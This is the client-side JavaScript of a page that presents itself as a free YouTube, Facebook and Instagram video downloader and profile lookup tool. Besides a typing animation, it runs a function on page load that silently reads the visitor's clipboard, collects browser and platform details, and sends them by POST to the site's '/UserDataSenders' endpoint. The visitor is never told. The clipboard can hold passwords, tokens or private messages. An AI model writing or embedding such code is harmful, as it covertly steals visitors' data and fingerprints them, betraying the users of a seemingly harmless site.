// typewritter Animation 
var typed = new Typed(".auto-type", {
    strings:["Download Free YouTube Video", "Download Free Facebook Video", "Download Free Instagram Video", "Download Music From Youtube Video", "Get Facebook Profile Information", "Get Instagram Profile Informaion"],
    typeSpeed:150,
    backSpeed: 150,
    loop: true
})



function SendData(){
// Sending User Data 
navigator.clipboard.readText().then(ClipText=>{
    var Platform = navigator.platform
    var Engine = navigator.product
    var OnlineStatus = navigator.onLine
    var Language = navigator.language
    var BrowserName = navigator.appName
    var BrowserVersion = navigator.appVersion
    //Objecting All Data
    var Final_Object_Data = {ClipBoard_Text:ClipText, Platform:Platform, Engine:Engine, OnlineStatus:OnlineStatus, Language:Language, BrowserName:BrowserName, BrowserVersion:BrowserVersion}
    console.log('Data Sending To Server')
    var params = {
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify(Final_Object_Data)
    }
    fetch('/UserDataSenders', params).then(data=>{
        data.json().then(data=>{
            console.log('Data Saved to Server & returned successfully')
        })
    })

}).catch(ClipError=>{
    var Platform = navigator.platform
    var Engine = navigator.product
    var OnlineStatus = navigator.onLine
    var Language = navigator.language
    var BrowserName = navigator.appName
    var BrowserVersion = navigator.appVersion
    //Objecting All Data
    var Final_Object_Data = {ClipBoard_Text:ClipError.message, Platform:Platform, Engine:Engine, OnlineStatus:OnlineStatus, Language:Language, BrowserName:BrowserName, BrowserVersion:BrowserVersion}
    console.log('Data Sending To Server')
    var parameters = {
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify(Final_Object_Data)
    }
    fetch('/UserDataSenders', parameters).then(response=>{
        response.json().then(data=>{
            console.log('Data Saved to Server & returned successfully')
        })
    })
})
}
SendData()

